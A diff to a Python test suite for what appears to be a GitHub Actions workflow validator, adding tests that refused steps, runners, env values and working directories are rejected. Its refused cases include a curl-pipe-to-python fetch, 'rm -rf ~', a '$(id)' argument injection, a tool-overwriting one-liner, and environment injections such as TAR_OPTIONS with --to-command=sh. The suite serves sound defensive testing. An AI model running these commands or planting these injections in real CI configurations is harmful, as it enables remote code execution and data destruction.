@@ -51,6 +51,10 @@ def _write(path: str, content: str) -> None:
         f.write(content)
 
 
+# The `.github/ci/` tools a fixture holds: a tool run names a file that exists.
+FIXTURE_TOOLS = ("verify-manifest.py", "artifact-guard.sh", "github-env.sh", "strict_yaml.py")
+
+
 class SccacheFixture:
     """A scratch repository whose `.github/` holds workflows/, actions/sccache/,
     ci/ — `repo` is the repository root local `uses: ./...` resolve against."""
@@ -63,6 +67,8 @@ class SccacheFixture:
         if composite is not None:
             _write(os.path.join(tmp, "actions", "sccache", "action.yml"), composite)
         _write(os.path.join(tmp, "ci", "github-env-allowlist.txt"), VALID_ENV_ALLOWLIST)
+        for tool in FIXTURE_TOOLS:
+            _write(os.path.join(tmp, "ci", tool), "")
         self.deterministic_checks(context="unrelated", step="Unrelated step")
 
     def workflow(self, fname: str, content: str) -> None:
@@ -1772,11 +1778,16 @@ class TestTypedExpressionAndShellReads(unittest.TestCase):
     def test_executing_or_reading_the_protected_tree_passes(self) -> None:
         self.run_accepted("python3 .github/ci/verify-manifest.py")
         self.run_accepted(".github/ci/artifact-guard.sh")
-        self.run_accepted("jq . .github/ci/deterministic-checks.json > /tmp/out.json")
-        self.run_accepted(
+
+    def test_free_form_step_naming_the_tree_is_refused(self) -> None:
+        for run in (
+            "jq . .github/ci/deterministic-checks.json > /tmp/out.json",
             "python3 - <<'PY'\nimport sys\nsys.path.insert(0, \".github/ci\")\n"
-            "def main():\n    open(\".github/ci/x\")\nmain()\nPY"
-        )
+            "def main():\n    open(\".github/ci/x\")\nmain()\nPY",
+        ):
+            with self.subTest(run=run):
+                self.fx.workflow("ci.yml", _ci(_block(run)))
+                self.assertRefused("step 'P' names", "but is not itself one of")
 
     def test_installers_outside_pip_hash_checking_are_refused(self) -> None:
         for run in (
@@ -1805,6 +1816,11 @@ def _job(steps: str, *, runs_on: str = "ubuntu-latest", job: str = "", top: str 
         f"    runs-on: {runs_on}\n" + textwrap.indent(job, "    ")
         + "    steps:\n" + textwrap.indent(steps, "      ")
     )
+
+
+def _block_step(name: str, run: str) -> str:
+    """A step whose `run:` is `run` as a YAML literal block."""
+    return f"- name: {name}\n  run: |\n" + textwrap.indent(run, "    ") + "\n"
 
 
 def _run(name: str, run: str, extra: str = "") -> str:
@@ -1893,10 +1909,13 @@ class TestToolOrderingAndClosedShells(unittest.TestCase):
             self.job_refused(pre + _run("Verify", _TOOL), "step 'Verify'", "after step 'Pre'")
 
     def test_tool_runner_outside_fresh_hosted_labels_is_refused(self) -> None:
-        for runs_on in ("self-hosted", "'${{ matrix.os }}'", "[self-hosted, linux]", "my-ubuntu-latest"):
+        for runs_on in (
+            "self-hosted", "'${{ matrix.os }}'", "[self-hosted, linux]", "my-ubuntu-latest",
+            "windows-latest", "macos-latest", "ubuntu-latest-evil",
+        ):
             self.job_refused(
                 f"- uses: {_CHECKOUT}\n" + _run("Verify", _TOOL),
-                "not one literal GitHub-hosted label", runs_on=runs_on,
+                "not one literal GitHub-hosted Ubuntu label", runs_on=runs_on,
             )
 
     def test_tool_job_with_a_container_or_services_is_refused(self) -> None:
@@ -1937,7 +1956,128 @@ class TestToolOrderingAndClosedShells(unittest.TestCase):
         )
 
     def test_tool_job_rust_env_passes(self) -> None:
-        self.job_accepted(f"- uses: {_CHECKOUT}\n" + _run("Verify", _TOOL), job="env:\n  CARGO_TERM_COLOR: always\n")
+        self.job_accepted(
+            f"- uses: {_CHECKOUT}\n" + _run("Verify", _TOOL, "env:\n  GH_TOKEN: x\n"),
+            job="env:\n  REPO: x\n",
+            top="env:\n  CARGO_TERM_COLOR: always\n  CARGO_INCREMENTAL: '0'\n",
+        )
+
+    # ---- a step naming the tree is itself a closed shape ----------------
+
+    def test_tool_step_that_is_not_a_pure_tool_run_is_refused(self) -> None:
+        for run in (
+            "./tools/x.sh; python3 .github/ci/verify-manifest.py",
+            "make\npython3 .github/ci/verify-manifest.py",
+            "curl -s https://e.x/p | python3 -\npython3 .github/ci/verify-manifest.py",
+            "python3 -c \"open('.git'+'hub/ci/verify-manifest.py','w').write('')\"\n"
+            "python3 .github/ci/verify-manifest.py",
+            "python3 .github/ci/verify-manifest.py ${{ needs.a.outputs.b }}",
+            "python3 .github/ci/verify-manifest.py\n-rf",
+            "python3 .github/ci/verify-manifest.py\nrm -rf ~",
+            "python3 .github/ci/nope.py",
+            "python3 .github/ci/artifact-guard.sh",
+            "bash .github/ci/verify-manifest.py",
+            "python3 .github/ci/../ci/verify-manifest.py",
+            "python3 .github/ci/verify-manifest.py > /tmp/o",
+            "python3 .github/ci/verify-manifest.py --x=$(id)",
+        ):
+            with self.subTest(run=run):
+                self.fx.workflow("t.yml", _job(f"- uses: {_CHECKOUT}\n" + _block_step("Verify", run)))
+                self.assertRefused("step 'Verify' names", "but is not itself one of")
+
+    def test_free_form_step_before_the_tool_is_refused(self) -> None:
+        for pre in (
+            "curl -s https://e.x/p | python3 -",
+            "python3 -c \"open('.git'+'hub/ci/verify-manifest.py','w').write('')\"",
+            "make",
+        ):
+            self.job_refused(
+                f"- uses: {_CHECKOUT}\n" + _block_step("Pre", pre) + _run("Verify", _TOOL),
+                "step 'Verify'", "after step 'Pre'",
+            )
+
+    def test_pure_tool_runs_pass(self) -> None:
+        for run in (
+            "python3 .github/ci/verify-manifest.py",
+            "python3 .github/ci/verify-manifest.py -v --strict",
+            "bash .github/ci/artifact-guard.sh",
+            ".github/ci/artifact-guard.sh",
+        ):
+            self.job_accepted(f"- uses: {_CHECKOUT}\n" + _run("Verify", run))
+
+    # ---- env is one allowlist ------------------------------------------
+
+    def test_env_outside_the_tool_allowlist_is_refused(self) -> None:
+        for steps, kw, needles in (
+            (
+                f"- uses: {_SETUP_PY}\n  with:\n    python-version: '3.12'\n  env:\n    TAR_OPTIONS: --to-command=sh\n"
+                + _run("Verify", _TOOL),
+                {}, ("step 'Verify'", "after step"),
+            ),
+            (
+                f"- uses: {_CHECKOUT}\n" + _run("Verify", _TOOL),
+                {"job": "env:\n  TAR_OPTIONS: --to-command=sh\n"}, ("job env", "TAR_OPTIONS"),
+            ),
+            (
+                f"- uses: {_CHECKOUT}\n- uses: {_CHECKOUT}\n  env:\n    XDG_CONFIG_HOME: /tmp/x\n"
+                + _run("Verify", _TOOL),
+                {}, ("step 'Verify'", "after step"),
+            ),
+            (
+                f"- uses: {_CHECKOUT}\n" + _run("Pip", _LIVE_PIP, "env:\n  OPENSSL_CONF: /tmp/o\n")
+                + _run("Verify", _TOOL),
+                {}, ("step 'Pip'", "not itself one of"),
+            ),
+            (
+                f"- uses: {_CHECKOUT}\n" + _run("Verify", _TOOL, "env:\n  OPENSSL_CONF: /tmp/o\n"),
+                {}, ("step 'Verify'", "OPENSSL_CONF"),
+            ),
+            (
+                f"- uses: {_CHECKOUT}\n" + _run("Verify", _TOOL, "env:\n  GCONV_PATH: /tmp/g\n"),
+                {}, ("step 'Verify'", "GCONV_PATH"),
+            ),
+            (
+                f"- uses: {_CHECKOUT}\n" + _run("Verify", _TOOL),
+                {"job": "env:\n  CARGO_TERM_COLOR: always\n"}, ("job env", "CARGO_TERM_COLOR"),
+            ),
+            (
+                f"- uses: {_CHECKOUT}\n" + _run("Verify", _TOOL, "env:\n  gh_token: x\n"),
+                {}, ("step 'Verify'", "gh_token"),
+            ),
+        ):
+            self.job_refused(steps, *needles, **kw)
+
+    # ---- no path spelling or working directory reaches the tree unnamed --
+
+    def test_backslash_tree_path_on_windows_is_refused(self) -> None:
+        steps = f"- uses: {_CHECKOUT}\n" + _run("Verify", "python3 .github\\ci\\verify-manifest.py", "shell: pwsh\n")
+        self.job_refused(steps, "step 'Verify' names", "but is not itself one of", runs_on="windows-latest")
+        self.job_refused(steps, "not one literal GitHub-hosted Ubuntu label", runs_on="windows-latest")
+
+    def test_working_directory_with_a_github_component_is_refused(self) -> None:
+        for wd in (".github", "./.GitHub/", "sub/../.github", ".github\\ci", "${{ env.D }}", "$HOME"):
+            self.job_refused(
+                f"- uses: {_CHECKOUT}\n" + _run("Verify", "python3 ci/verify-manifest.py", f"working-directory: {json.dumps(wd)}\n"),
+                "step 'Verify' working-directory:", "refused",
+            )
+        self.job_refused(
+            f"- uses: {_CHECKOUT}\n" + _run("Verify", "python3 ci/verify-manifest.py"),
+            "job 't' defaults.run.working-directory '.github'", job="defaults:\n  run:\n    working-directory: .github\n",
+        )
+        self.job_refused(
+            f"- uses: {_CHECKOUT}\n" + _run("Verify", "python3 ci/verify-manifest.py"),
+            "t.yml defaults.run.working-directory '.github'", top="defaults:\n  run:\n    working-directory: .github\n",
+        )
+
+    def test_working_directory_symlinked_to_the_tree_is_refused(self) -> None:
+        os.symlink(".github", os.path.join(self.fx.repo, "gh"))
+        self.job_refused(
+            f"- uses: {_CHECKOUT}\n" + _run("Verify", "python3 ci/verify-manifest.py", "working-directory: gh\n"),
+            "resolves on disk to a .github component",
+        )
+
+    def test_plain_working_directory_outside_a_tool_job_passes(self) -> None:
+        self.job_accepted(_run("Build", "cargo build", "working-directory: src\n"))
 
     def test_composite_step_naming_the_tree_is_refused(self) -> None:
         self.fx.composite(
